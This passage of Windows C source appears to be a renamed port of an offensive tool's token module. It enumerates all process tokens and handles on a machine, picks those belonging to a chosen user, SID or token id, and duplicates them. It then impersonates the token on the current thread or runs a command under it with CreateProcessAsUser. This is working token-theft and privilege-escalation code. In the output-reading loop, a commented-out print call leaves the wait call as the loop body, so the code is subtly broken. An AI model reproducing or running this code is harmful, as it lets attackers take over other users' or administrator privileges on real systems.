        status = NT_SUCCESS(LsaQueryInformationPolicy(hLSA, PolicyDnsDomainInformation, (PVOID*)pDomainInfo));
        LsaClose(hLSA);
    }
    return status;
}

BOOL ai_s_net_CreateWellKnownSid(WELL_KNOWN_SID_TYPE WellKnownSidType, PSID DomainSid, PSID* pSid)
{
    BOOL status    = FALSE;
    DWORD szNeeded = 0, dwError;
    CreateWellKnownSid(WellKnownSidType, DomainSid, NULL, &szNeeded);
    dwError = GetLastError();
    if ((dwError == ERROR_INVALID_PARAMETER) || (dwError == ERROR_INSUFFICIENT_BUFFER))
        if (*pSid = (PSID)LocalAlloc(LPTR, szNeeded))
            if (!(status = CreateWellKnownSid(WellKnownSidType, DomainSid, *pSid, &szNeeded)))
                *pSid = LocalFree(*pSid);
    return status;
}

BOOL ai_s_token_getNameDomainFromSID(PSID pSid, PWSTR* pName, PWSTR* pDomain, PSID_NAME_USE pSidNameUse,
                                       LPCWSTR system)
{
    BOOL result = FALSE;
    SID_NAME_USE sidNameUse;
    PSID_NAME_USE peUse = pSidNameUse ? pSidNameUse : &sidNameUse;
    DWORD cchName = 0, cchReferencedDomainName = 0;

    if (!LookupAccountSid(system, pSid, NULL, &cchName, NULL, &cchReferencedDomainName, peUse) &&
        (GetLastError() == ERROR_INSUFFICIENT_BUFFER))
    {
        if (*pName = (PWSTR)LocalAlloc(LPTR, cchName * sizeof(wchar_t)))
        {
            if (*pDomain = (PWSTR)LocalAlloc(LPTR, cchReferencedDomainName * sizeof(wchar_t)))
            {
                result = LookupAccountSid(system, pSid, *pName, &cchName, *pDomain, &cchReferencedDomainName, peUse);
                if (!result)
                    *pDomain = (PWSTR)LocalFree(*pDomain);
            }
            if (!result)
                *pName = (PWSTR)LocalFree(*pName);
        }
    }
    return result;
}

BOOL ai_s_token_getTokensUnique(PAI_S_TOKEN_ENUM_CALLBACK callBack, PVOID pvArg)
{
    BOOL status = FALSE, mustContinue = TRUE;
    AI_S_TOKEN_LIST list = {0}, *cur, *tmp;
    if (status = ai_s_token_getTokens(ai_s_token_getTokensUnique_callback, &list))
    {
        for (cur = &list; cur && mustContinue; cur = cur->next)
            mustContinue = callBack(cur->hToken, cur->ptid, pvArg);
        for (cur = &list; cur; cur = tmp)
        {
            if (cur->hToken)
                CloseHandle(cur->hToken);
            tmp = cur->next;
            if (cur != &list)
                LocalFree(cur);
        }
    }
    return status;
}

BOOL ai_s_token_getTokens(PAI_S_TOKEN_ENUM_CALLBACK callBack, PVOID pvArg)
{
    BOOL status                 = FALSE;
    AI_S_TOKEN_ENUM_DATA data = {callBack, pvArg, TRUE};
    if (status = NT_SUCCESS(ai_s_process_getProcessInformation(ai_s_token_getTokens_process_callback, &data)))
        if (data.mustContinue)
            status = NT_SUCCESS(ai_s_handle_getHandlesOfType(ai_s_token_getTokens_handles_callback, L"Token",
                                                               TOKEN_QUERY | TOKEN_DUPLICATE, 0, &data));
    return status;
}


BOOL CALLBACK ai_s_token_list_or_elevate_callback(HANDLE hToken, DWORD ptid, PVOID pvArg)
{
    HANDLE hNewToken;
    TOKEN_STATISTICS tokenStats;
    DWORD szNeeded;
    BOOL isUserOK                    = TRUE;
    PAI_S_TOKEN_ELEVATE_DATA pData = (PAI_S_TOKEN_ELEVATE_DATA)pvArg;
    PWSTR name, domainName;
    TOKEN_TYPE ttTarget;
    SECURITY_IMPERSONATION_LEVEL ilTarget;
    PTOKEN_USER pUser;
    if (ptid != GetCurrentProcessId())
    {
        if (GetTokenInformation(hToken, TokenStatistics, &tokenStats, sizeof(TOKEN_STATISTICS), &szNeeded))
        {
            if (pData->pUsername)
            {
                if (ai_s_token_getNameDomainFromToken(hToken, &name, &domainName, NULL, NULL))
                {
                    isUserOK = (_wcsicmp(name, pData->pUsername) == 0);
                    LocalFree(name);
                    LocalFree(domainName);
                }
            }
            else if (pData->tokenId)
                isUserOK = (pData->tokenId == tokenStats.TokenId.LowPart);
            else if (pData->pSid)
            {
                isUserOK = FALSE;
                if (pData->isSidDirectUser)
                {
                    if (pUser = ai_s_token_getUserFromToken(hToken))
                    {
                        isUserOK = EqualSid(pUser->User.Sid, pData->pSid);
                        LocalFree(pUser);
                    }
                }
                else
                    ai_s_token_CheckTokenMembership(hToken, pData->pSid, &isUserOK);
            }

            if (isUserOK)
            {
                LOGW_DEBUG(L"ptid:%u", ptid);
                //kuhl_m_token_displayAccount(hToken, FALSE);
                if (pData->elevateIt)
                {
                    ttTarget = TokenImpersonation;
                    ilTarget =
                        (tokenStats.TokenType == TokenPrimary) ? SecurityDelegation : tokenStats.ImpersonationLevel;
                }
                else if (pData->runIt)
                {
                    ttTarget = TokenPrimary;
                    ilTarget = SecurityAnonymous;
                }

                if (pData->elevateIt || pData->runIt)
                {
                    if (DuplicateTokenEx(hToken,
                                         TOKEN_QUERY | TOKEN_IMPERSONATE |
                                             (pData->runIt ? (TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE |
                                                              TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID)
                                                           : 0),
                                         NULL, ilTarget, ttTarget, &hNewToken))
                    {
                        if (pData->elevateIt)
                        {
                            if (SetThreadToken(NULL, hNewToken))
                            {
                                LOGW_DEBUG(L" -> Impersonated !");
                                ai_s_token_whoami(0, NULL);
                                isUserOK = FALSE;
                            }
                            else
                                LOGW_ERROR(L"SetThreadToken error! %lu", GetLastError());
                        }
                        else if (pData->runIt)
                            isUserOK = !ai_s_process_run_data(pData->pCommandLine, hNewToken);

                        CloseHandle(hNewToken);
                    }
                }
            }
            else
                isUserOK = TRUE;
        }
    }
    return isUserOK;
}


BOOL CALLBACK ai_s_token_getTokensUnique_callback(HANDLE hToken, DWORD ptid, PVOID pvArg)
{
    PAI_S_TOKEN_LIST list = (PAI_S_TOKEN_LIST)pvArg, cur, old = NULL;
    HANDLE my = GetCurrentProcess();
    if (list->hToken)
    {
        for (cur = list; cur; old = cur, cur = cur->next)
            if (ai_s_token_equal(hToken, cur->hToken))
                break;
        if (!cur && old)
            if (old->next = (PAI_S_TOKEN_LIST)LocalAlloc(LPTR, sizeof(AI_S_TOKEN_LIST)))
            {
                old->next->ptid = ptid;
                if (!DuplicateHandle(my, hToken, (HANDLE)my, &old->next->hToken, 0, FALSE, DUPLICATE_SAME_ACCESS))
                    LOGW_ERROR(L"DuplicateHandle error! %lu", GetLastError());
            }
    }
    else
    {
        list->ptid = ptid;
        if (!DuplicateHandle(my, hToken, my, &list->hToken, 0, FALSE, DUPLICATE_SAME_ACCESS))
            LOGW_ERROR(L"DuplicateHandle error! %lu", GetLastError());
    }
    return TRUE;
}

BOOL ai_s_token_equal(IN HANDLE First, IN HANDLE Second)
{
    BOOL status = FALSE;
    BOOLEAN lit;
    NTSTATUS ntStatus;
    DWORD s1, s2, szRet;
    ntStatus = NtCompareTokens(First, Second, &lit);
    if (NT_SUCCESS(ntStatus))
    {
        if (status = lit)
            if (GetTokenInformation(First, TokenSessionId, &s1, sizeof(DWORD), &szRet) &&
                GetTokenInformation(Second, TokenSessionId, &s2, sizeof(DWORD), &szRet))
                status = (s1 == s2);
    }
    else
        LOGW_ERROR(L"NtCompareTokens: %08x, %lu", ntStatus, GetLastError());
    return status;
}

BOOL ai_s_token_getNameDomainFromToken(HANDLE hToken, PWSTR* pName, PWSTR* pDomain, PWSTR* pSid,
                                         PSID_NAME_USE pSidNameUse)
{
    BOOL result = FALSE;
    PTOKEN_USER pTokenUser;
    DWORD szNeeded;

    if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &szNeeded) && (GetLastError() == ERROR_INSUFFICIENT_BUFFER))
    {
        if (pTokenUser = (PTOKEN_USER)LocalAlloc(LPTR, szNeeded))
        {
            if (GetTokenInformation(hToken, TokenUser, pTokenUser, szNeeded, &szNeeded))
            {
                if ((result =
                         ai_s_token_getNameDomainFromSID(pTokenUser->User.Sid, pName, pDomain, pSidNameUse, NULL)) &&
                    pSid)
                    result = ConvertSidToStringSid(pTokenUser->User.Sid, pSid);
            }
            LocalFree(pTokenUser);
        }
    }
    return result;
}

PTOKEN_USER ai_s_token_getUserFromToken(HANDLE hToken)
{
    PTOKEN_USER pTokenUser = NULL;
    DWORD szNeeded;
    if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &szNeeded) && (GetLastError() == ERROR_INSUFFICIENT_BUFFER))
    {
        if (pTokenUser = (PTOKEN_USER)LocalAlloc(LPTR, szNeeded))
        {
            if (!GetTokenInformation(hToken, TokenUser, pTokenUser, szNeeded, &szNeeded))
                pTokenUser = (PTOKEN_USER)LocalFree(pTokenUser);
        }
    }
    return pTokenUser;
}

NTSTATUS ai_s_token_whoami(int argc, wchar_t* argv[])
{
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        LOGW_DEBUG(L"* Process Token : %x", hToken);
        CloseHandle(hToken);
    }
    else
        LOGW_ERROR(L"OpenProcessToken error! %lu", GetLastError());

    
    if (OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hToken))
    {
        LOGW_DEBUG(L" * Thread Token  : %x", hToken);
        CloseHandle(hToken);
    }
    else if (GetLastError() == ERROR_NO_TOKEN)
        LOGW_ERROR(L"no token");
    else
        LOGW_ERROR(L"OpenThreadToken error! %lu", GetLastError());

    return STATUS_SUCCESS;
}

BOOL ai_s_token_CheckTokenMembership(__in_opt HANDLE TokenHandle, __in PSID SidToCheck, __out PBOOL IsMember)
{
    BOOL status = FALSE, isDupp = FALSE;
    TOKEN_TYPE type;
    DWORD szNeeded;
    HANDLE effHandle;

    if (GetTokenInformation(TokenHandle, TokenType, &type, sizeof(TOKEN_TYPE), &szNeeded))
    {
        if (type == TokenPrimary)
        {
            isDupp = DuplicateTokenEx(TokenHandle, TOKEN_QUERY, NULL, SecurityIdentification, TokenImpersonation,
                                      &effHandle);
            if (!isDupp)
                LOGW_ERROR(L"DuplicateTokenEx error! %lu", GetLastError());
        }
        else
            effHandle = TokenHandle;

        if (isDupp || (type != TokenPrimary))
        {
            if (!(status = CheckTokenMembership(effHandle, SidToCheck, IsMember)))
                LOGW_ERROR(L"CheckTokenMembership error! %lu", GetLastError());
            if (isDupp)
                CloseHandle(effHandle);
        }
    }
    else
        LOGW_ERROR(L"GetTokenInformation error! %lu", GetLastError());
    return status;
}

NTSTATUS ai_s_handle_getHandles(PAI_S_SYSTEM_HANDLE_ENUM_CALLBACK callBack, PVOID pvArg)
{
    NTSTATUS status;
    ULONG i;
    PSYSTEM_HANDLE_INFORMATION buffer = NULL;
    status                            = ai_s_process_NtQuerySystemInformation(SystemHandleInformation, &buffer, 0);
    if (NT_SUCCESS(status))
    {
        for (i = 0; (i < buffer->HandleCount) && callBack(&buffer->Handles[i], pvArg); i++)
            ;
        LocalFree(buffer);
    }
    return status;
}

NTSTATUS ai_s_handle_getHandlesOfType(PAI_S_HANDLE_ENUM_CALLBACK callBack, LPCTSTR type, DWORD dwDesiredAccess,
                                        DWORD dwOptions, PVOID pvArg)
{
    UNICODE_STRING uStr;
    HANDLE_ENUM_DATA data = {NULL, dwDesiredAccess, dwOptions, callBack, pvArg};
    if (type)
    {
        RtlInitUnicodeString(&uStr, type);
        data.type = &uStr;
    }
    return ai_s_handle_getHandles(ai_s_handle_getHandlesOfType_callback, &data);
}

BOOL CALLBACK ai_s_handle_getHandlesOfType_callback(PSYSTEM_HANDLE pSystemHandle, PVOID pvArg)
{
    PHANDLE_ENUM_DATA pData = (PHANDLE_ENUM_DATA)pvArg;
    BOOL status             = TRUE;
    HANDLE hProcess, hRemoteHandle;
    POBJECT_TYPE_INFORMATION pInfos;
    ULONG szNeeded;
    if (hProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, pSystemHandle->ProcessId))
    {
        if (DuplicateHandle(hProcess, (HANDLE)pSystemHandle->Handle, GetCurrentProcess(), &hRemoteHandle,
                            pData->dwDesiredAccess, TRUE, pData->dwOptions))
        {
            if (NtQueryObject(hRemoteHandle, ObjectTypeInformation, NULL, 0, &szNeeded) == STATUS_INFO_LENGTH_MISMATCH)
            {
                if (pInfos = (POBJECT_TYPE_INFORMATION)LocalAlloc(LPTR, szNeeded))
                {
                    if (NT_SUCCESS(NtQueryObject(hRemoteHandle, ObjectTypeInformation, pInfos, szNeeded, &szNeeded)))
                    {
                        if (!pData->type || RtlEqualUnicodeString(&pInfos->TypeName, pData->type, TRUE))
                            status = pData->callBack(hRemoteHandle, pSystemHandle, pData->pvArg);
                    }
                    LocalFree(pInfos);
                }
            }
            CloseHandle(hRemoteHandle);
        }
        CloseHandle(hProcess);
    }
    return status;
}

NTSTATUS ai_s_process_NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS informationClass, PVOID buffer,
                                                 ULONG informationLength)
{
    NTSTATUS status = STATUS_INFO_LENGTH_MISMATCH;
    DWORD sizeOfBuffer, returnedLen;

    if (*(PVOID*)buffer)
    {
        status = NtQuerySystemInformation(informationClass, *(PVOID*)buffer, informationLength, &returnedLen);
    }
    else
    {
        for (sizeOfBuffer = 0x1000;
             (status == STATUS_INFO_LENGTH_MISMATCH) && (*(PVOID*)buffer = LocalAlloc(LPTR, sizeOfBuffer));
             sizeOfBuffer <<= 1)
        {
            status = NtQuerySystemInformation(informationClass, *(PVOID*)buffer, sizeOfBuffer, &returnedLen);
            if (!NT_SUCCESS(status))
                LocalFree(*(PVOID*)buffer);
        }
    }
    return status;
}

NTSTATUS ai_s_process_getProcessInformation(PAI_S_PROCESS_ENUM_CALLBACK callBack, PVOID pvArg)
{
    NTSTATUS status;
    PSYSTEM_PROCESS_INFORMATION buffer = NULL, myInfos;
    status                             = ai_s_process_NtQuerySystemInformation(SystemProcessInformation, &buffer, 0);
    if (NT_SUCCESS(status))
    {
        for (myInfos = buffer; callBack(myInfos, pvArg) && myInfos->NextEntryOffset;
             myInfos = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)myInfos + myInfos->NextEntryOffset))
            ;
        LocalFree(buffer);
    }
    return status;
}


BOOL CALLBACK ai_s_token_getTokens_process_callback(PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation,
                                                      PVOID pvArg)
{
    BOOL status = TRUE;
    HANDLE hProcess, hToken;
    if (hProcess =
            OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, PtrToUlong(pSystemProcessInformation->UniqueProcessId)))
    {
        if (OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken))
        {
            status = ((PAI_S_TOKEN_ENUM_DATA)pvArg)
                         ->callback(hToken, PtrToUlong(pSystemProcessInformation->UniqueProcessId),
                                    ((PAI_S_TOKEN_ENUM_DATA)pvArg)->pvArg);
            CloseHandle(hToken);
        }
        CloseHandle(hProcess);
    }
    return (((PAI_S_TOKEN_ENUM_DATA)pvArg)->mustContinue = status);
}

BOOL CALLBACK ai_s_token_getTokens_handles_callback(HANDLE handle, PSYSTEM_HANDLE pSystemHandle, PVOID pvArg)
{
    return (((PAI_S_TOKEN_ENUM_DATA)pvArg)->mustContinue =
                ((PAI_S_TOKEN_ENUM_DATA)pvArg)
                    ->callback(handle, pSystemHandle->ProcessId, ((PAI_S_TOKEN_ENUM_DATA)pvArg)->pvArg));
}

BOOL ai_s_process_run_data(LPCWSTR commandLine, HANDLE hToken)
{
    BOOL status                = FALSE;
    SECURITY_ATTRIBUTES saAttr = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
    STARTUPINFO si             = {0};
    PROCESS_INFORMATION pi     = {0};
    HANDLE hOut                = NULL;
    PWSTR dupCommandLine       = NULL;
    BYTE chBuf[4096];
    DWORD dwRead, i;
    LPVOID env = NULL;

    if (dupCommandLine = _wcsdup(commandLine))
    {
        if (CreatePipe(&hOut, &si.hStdOutput, &saAttr, 0))
        {
            SetHandleInformation(hOut, HANDLE_FLAG_INHERIT, 0);
            si.cb        = sizeof(STARTUPINFO);
            si.hStdError = si.hStdOutput;
            si.dwFlags |= STARTF_USESTDHANDLES;
            if (!hToken || CreateEnvironmentBlock(&env, hToken, FALSE))
            {
                if (status = CreateProcessAsUser(hToken, NULL, dupCommandLine, NULL, NULL, TRUE,
                                                 CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, env, NULL, &si, &pi))
                {
                    CloseHandle(si.hStdOutput);
                    si.hStdOutput = si.hStdError = NULL;
                    while (ReadFile(hOut, chBuf, sizeof(chBuf), &dwRead, NULL) && dwRead)
                        for (i = 0; i < dwRead; i++)
                            //kprintf(L"%c", chBuf[i]);
                    WaitForSingleObject(pi.hProcess, INFINITE);
                    CloseHandle(pi.hThread);
                    CloseHandle(pi.hProcess);
                }
                else
                    LOGW_ERROR(L"CreateProcessAsUser error! %lu", GetLastError());
                if (env)
                    DestroyEnvironmentBlock(env);
            }
            else
                LOGW_ERROR(L"CreateEnvironmentBlock error! %lu", GetLastError());
            CloseHandle(hOut);
            if (si.hStdOutput)
                CloseHandle(si.hStdOutput);
        }
        free(dupCommandLine);
    }
    return status;
}
